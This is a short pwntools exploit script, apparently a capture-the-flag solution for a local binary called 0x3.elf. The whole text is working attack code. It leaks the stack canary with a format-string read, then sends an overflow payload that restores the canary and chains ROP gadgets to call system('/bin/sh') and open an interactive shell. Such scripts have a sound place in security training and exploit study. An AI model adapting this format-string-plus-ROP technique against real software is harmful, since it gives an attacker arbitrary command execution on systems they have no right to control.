from pwn import *

context.update(arch="amd64", os="linux")
context.binary = ELF("./0x3.elf")
p = process("./0x3.elf")

p.recvuntil(b"\n")
p.sendline(b"%p,"*13)

cookie = p.recvline().split(b",")[12]
info(f"Leaked cookie: {cookie.decode()}")

payload  = b"A"*56              # answer + name
payload += p64(int(cookie, 16)) # cookie
payload += b"A"*8               # rbp
payload += p64(0x7ffff7e057e5)  # pop rdi; ret
payload += p64(0x7ffff7f74031)  # /bin/sh
payload += p64(0x7ffff7e04e99)  # ret
payload += p64(0x7ffff7e2a490)  # system()

p.sendline(payload)
p.interactive()
